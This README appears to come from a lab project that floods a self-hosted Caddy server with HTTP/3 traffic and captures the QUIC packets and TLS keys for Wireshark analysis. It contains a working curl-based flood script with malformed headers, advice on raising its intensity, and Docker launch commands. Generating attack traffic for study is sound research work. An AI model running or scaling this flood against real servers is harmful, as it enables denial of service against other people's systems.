# HTTP3-Flood Attack

This module launches a high-volume HTTP/3 flooding attack using `curl` in a Docker container.  
The goal is to overwhelm the target server with large amounts of QUIC traffic.

---

## 🔧 Prerequisites

- Ensure the **Caddy server** is running with HTTP/3 support.  
  If not yet set up, refer to the root [`CaddySetup.md`](../docs/CaddySetup.md) for installation and configuration instructions.

- Docker must be installed on the attacking machine.

- The project folder should contain:
  - `Dockerfile`
  - `http3-flood.sh` (the attack script)
  - An `output/` directory (to store captured PCAP and TLS key files)

---

## 📝 Attack Script Configuration

Open `http3-flood.sh` and edit the target URL:
```bash
seq 1 10 | xargs -n1 -P10 timeout 1s curl --insecure -X GET https://<your-server-ip> \
-H "method: HEAD" -H "method: POST" -H "method: GET" -H "settings: 0" \
--data "\x00\x00..." --http3 -v -o /dev/null
```
- Replace <your-server-ip> with the IP or domain of your target server.
- You can change the intensity using seq and -P values (more parallel threads =   stronger flood).

## 🐳 Docker Setup and Execution
#### 0. Install Docker if it's missing
```bash
sudo apt update
sudo apt install docker.io
sudo systemctl enable docker
sudo systemctl start docker
```

### 1. Build the Docker Image
```bash
docker build -t curl-http3 .
```

### 2. Run the Container and Launch the Attack
```bash
docker run -it \
  --network host \
  --cap-add=NET_ADMIN \
  --cap-add=NET_RAW \
  -e SSLKEYLOGFILE=/tmp/sslkeys.log \
  -v $(pwd)/output:/tmp \
  curl-http3
```
Once inside the container:

```bash
tcpdump -i any -w /tmp/attack.pcap &
bash /root/http3-flood.sh
pkill tcpdump
```
Captured files will be saved to the output/ folder on your host:
- attack.pcap (captured packets)
- sslkeys.log (used to decrypt QUIC)

---

## 🔓 Decrypting QUIC Traffic in Wireshark
- 1. Open output/attack.pcap in Wireshark.

- 2. Go to:
        Edit → Preferences → Protocols → TLS

- 3. Set the log file path:
```bash
(Pre)-Master-Secret log filename: ./output/sslkeys.log
```
- 4. Apply changes — decrypted HTTP/3 traffic should now be visible.

---

## ✅ Optional:
Modify and run timer_script.sh in another terminal to monitor the server's response time during the flood.


